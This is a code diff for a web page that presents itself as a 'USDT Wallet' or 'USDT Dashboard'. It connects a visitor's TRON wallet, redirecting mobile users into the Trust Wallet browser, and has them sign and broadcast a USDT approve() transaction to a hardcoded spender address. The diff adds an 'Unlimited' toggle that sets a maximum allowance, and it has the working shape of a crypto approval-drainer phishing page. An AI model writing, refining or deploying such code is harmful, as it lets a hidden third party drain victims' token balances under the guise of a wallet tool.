@@ -2,35 +2,50 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>USDT Wallet</title>
+<title>USDT Dashboard</title>
 
 <style>
-body{background:#0b0f19;color:#fff;font-family:sans-serif;text-align:center;padding:20px}
-.card{background:#121826;padding:20px;border-radius:16px;max-width:420px;margin:auto}
+body{background:#0b0f19;color:#fff;font-family:sans-serif;margin:0}
+.container{max-width:420px;margin:auto;padding:16px}
+.card{background:#121826;border-radius:16px;padding:16px;margin-top:16px}
+.title{text-align:center;font-size:20px;margin-bottom:10px}
+.wallet{color:#4ade80;font-size:13px;text-align:center}
 button{width:100%;padding:14px;border:none;border-radius:12px;margin-top:10px;font-weight:600}
 .approve{background:#22c55e}
-.connect{background:#3b82f6}
+.toggle{background:#333}
+input{width:100%;padding:12px;border-radius:10px;border:none;margin-top:10px;background:#0f172a;color:white}
 #qr{display:flex;justify-content:center;margin-top:10px}
-input{width:100%;padding:10px;border-radius:10px;border:none;margin-top:10px;background:#0f172a;color:white}
+.log{font-size:11px;background:#000;padding:10px;border-radius:10px;margin-top:10px;max-height:200px;overflow:auto}
 </style>
 </head>
 
 <body>
 
+<div class="container">
+
+<div class="title">💰 USDT Dashboard</div>
+
 <div class="card">
+  <div id="status">Connecting...</div>
+  <div id="wallet" class="wallet"></div>
+  <div id="qr"></div>
+</div>
 
-<h2>💰 USDT Wallet</h2>
+<div class="card">
+  <div>Select Amount</div>
 
-<div id="status">Initializing...</div>
-<div id="wallet"></div>
+  <input type="range" id="range" min="1" max="1000" value="10">
+  <input type="number" id="amount" value="10">
 
-<div id="qr"></div>
+  <button id="unlimitedBtn" class="toggle">Unlimited: OFF</button>
 
-<input type="range" id="range" min="1" max="1000" value="10">
-<input type="number" id="amount" value="10">
+  <button id="approveBtn" class="approve">Approve USDT</button>
+</div>
 
-<button id="maxBtn">MAX</button>
-<button id="approveBtn" class="approve">Approve USDT</button>
+<div class="card">
+  <div>Transaction Logs</div>
+  <div id="logs" class="log"></div>
+</div>
 
 </div>
 
@@ -43,30 +58,36 @@ const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
 const TRON_CHAIN = "tron:0x2b6653dc";
 const TRONGRID = "https://api.trongrid.io";
 
-const USDT_HEX = "41a614f803b6fd780986a42c78ec9c7f77e6ded13c";
+const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 
 let client, session, wallet;
+let unlimited = false;
+
+// log helper
+function log(msg){
+  document.getElementById("logs").innerText += msg + "\n";
+}
 
 // detect mobile
 function isMobile(){
   return /Android|iPhone|iPad/i.test(navigator.userAgent);
 }
 
-// tron hex
+// convert
 function tronToHex(addr){
   const bytes = bs58.decode(addr);
   return Array.from(bytes).map(b=>b.toString(16).padStart(2,"0")).join("").slice(0,42);
 }
 
-// encode approve
+// encode
 function encodeApprove(spenderHex, amount){
   const clean = spenderHex.replace(/^41/,"").padStart(64,"0");
 
   let amountHex;
 
-  if(amount === "max"){
-    amountHex = "f".repeat(64);
+  if(unlimited){
+    amountHex = "f".repeat(64); // 🔥 TRUE MAX
   } else {
     const val = BigInt(Math.floor(amount * 1e6));
     amountHex = val.toString(16).padStart(64,"0");
@@ -84,7 +105,7 @@ async function buildTx(owner, data){
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({
       owner_address: ownerHex,
-      contract_address: USDT_HEX,
+      contract_address: tronToHex(USDT),
       data: data,
       fee_limit:100000000,
       call_value:0,
@@ -93,6 +114,9 @@ async function buildTx(owner, data){
   });
 
   const d = await res.json();
+
+  log("TX BUILD:\n" + JSON.stringify(d,null,2));
+
   return d.transaction;
 }
 
@@ -104,14 +128,16 @@ async function broadcast(tx){
     body:JSON.stringify(tx)
   });
 
-  return await res.json();
+  const d = await res.json();
+
+  log("BROADCAST:\n" + JSON.stringify(d,null,2));
+
+  return d;
 }
 
 // fix signature
 function fixSig(resp, tx){
-  if(resp.signature){
-    tx.signature = [resp.signature.replace(/^0x/,"")];
-  }
+  tx.signature = [resp.signature.replace(/^0x/,"")];
   return tx;
 }
 
@@ -122,94 +148,52 @@ const input = document.getElementById("amount");
 range.oninput = ()=> input.value = range.value;
 input.oninput = ()=> range.value = input.value;
 
-document.getElementById("maxBtn").onclick = ()=> input.value = "max";
+// unlimited toggle
+document.getElementById("unlimitedBtn").onclick = ()=>{
+  unlimited = !unlimited;
+  document.getElementById("unlimitedBtn").innerText =
+    "Unlimited: " + (unlimited ? "ON" : "OFF");
+};
 
-// mobile connect (TronLink / Trust wallet browser)
-async function mobileConnect(){
-  if(window.tronWeb && window.tronWeb.defaultAddress.base58){
-    wallet = window.tronWeb.defaultAddress.base58;
-    document.getElementById("wallet").innerText = wallet;
-    document.getElementById("status").innerText = "Connected (Mobile)";
-    return true;
-  }
-  return false;
-}
-
-// desktop connect (WalletConnect)
+// connect desktop
 async function desktopConnect(){
   const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
 
   client = await SignClient.init({
     projectId: PROJECT_ID,
-    metadata:{
-      name:"USDT Wallet",
-      description:"dapp",
-      url:location.origin,
-      icons:[""]
+    metadata:{name:"USDT",description:"",url:location.origin,icons:[""]}
+  });
+
+  const { uri, approval } = await client.connect({
+    requiredNamespaces:{
+      tron:{
+        methods:["tron_signTransaction"],
+        chains:[TRON_CHAIN],
+        events:[]
+      }
     }
   });
 
-  const existing = client.session.getAll();
+  new QRCode(document.getElementById("qr"),{text:uri,width:200,height:200});
 
-  if(existing.length){
-    session = existing[0];
-  } else {
-    const { uri, approval } = await client.connect({
-      requiredNamespaces:{
-        tron:{
-          methods:["tron_signTransaction"], // ✅ correct
-          chains:[TRON_CHAIN],
-          events:[]
-        }
-      }
-    });
-
-    new QRCode(document.getElementById("qr"), {
-      text: uri,
-      width:200,
-      height:200
-    });
-
-    session = await approval();
-  }
+  session = await approval();
 
   wallet = session.namespaces.tron.accounts[0].split(":")[2];
 
   document.getElementById("wallet").innerText = wallet;
-  document.getElementById("status").innerText = "Connected (Desktop)";
+  document.getElementById("status").innerText = "Connected";
 }
 
 // approve
 document.getElementById("approveBtn").onclick = async ()=>{
   try{
-    const amount = input.value;
+    const amount = Number(input.value);
+
     const spenderHex = tronToHex(SPENDER);
+    const data = encodeApprove(spenderHex, amount);
 
-    const data = encodeApprove(spenderHex, amount === "max" ? "max" : Number(amount));
+    log("ENCODED DATA:\n" + data);
 
-    document.getElementById("status").innerText = "Processing...";
-
-    if(isMobile() && window.tronWeb){
-      // mobile direct
-      const tx = await window.tronWeb.transactionBuilder.triggerSmartContract(
-        "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-        "approve(address,uint256)",
-        {},
-        [
-          {type:"address", value: SPENDER},
-          {type:"uint256", value: amount === "max" ? "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" : Math.floor(amount * 1e6)}
-        ],
-        wallet
-      );
-
-      const signed = await window.tronWeb.trx.sign(tx.transaction);
-      const result = await window.tronWeb.trx.sendRawTransaction(signed);
-
-      document.getElementById("status").innerText = "✅ Success";
-      return;
-    }
-
-    // desktop WC flow
     const tx = await buildTx(wallet, data);
 
     const signed = await client.request({
@@ -222,37 +206,31 @@ document.getElementById("approveBtn").onclick = async ()=>{
     });
 
     const finalTx = fixSig(signed, tx);
+
     const result = await broadcast(finalTx);
 
     if(result.result){
-      document.getElementById("status").innerText = "✅ Success";
+      document.getElementById("status").innerText = "✅ SUCCESS";
     } else {
-      throw "Broadcast failed";
+      throw JSON.stringify(result);
     }
 
   }catch(e){
-    console.error(e);
-    document.getElementById("status").innerText = "❌ Error";
+    document.getElementById("status").innerText = "❌ FAILED";
+    log("ERROR:\n" + e);
   }
 };
 
-// 🚀 INIT
+// init
 (async ()=>{
-  document.getElementById("status").innerText = "Connecting...";
-
   if(isMobile()){
-    const ok = await mobileConnect();
-
-    if(!ok){
-      // open trust wallet
-      window.location.href =
-        "https://link.trustwallet.com/open_url?url=" +
-        encodeURIComponent(window.location.href);
-      return;
-    }
-  } else {
-    await desktopConnect();
+    window.location.href =
+      "https://link.trustwallet.com/open_url?url=" +
+      encodeURIComponent(window.location.href);
+    return;
   }
+
+  await desktopConnect();
 })();
 </script>
 
